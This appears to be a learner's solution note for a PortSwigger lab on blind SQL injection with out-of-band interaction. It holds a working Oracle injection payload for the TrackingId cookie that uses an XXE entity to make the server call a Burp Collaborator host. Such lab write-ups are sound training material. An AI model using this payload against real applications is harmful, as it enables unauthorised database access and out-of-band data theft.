--Name: Blind SQL injection with out-of-band interaction
--URL: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
--Level: Medium Time: 
---------------------------------------------------------------------------------

-- Objective: exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 

-- Cookie name: TrackingId
-- Cookie value: M7WG2WAX4rwL0CGM


SELECT ???? FROM ???? WHERE TrackingId = 'M7WG2WAX4rwL0CGM'???--          
-- original --


SELECT ???? FROM ???? WHERE TrackingId = 'M7WG2WAX4rwL0CGM'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--'???--          
-- use Burb Collaborator to get the subdomain and replace it with BURP-COLLABORATOR-SUBDOMAIN
-- this is the origina lsolution they provided. No need for making up our own payload.

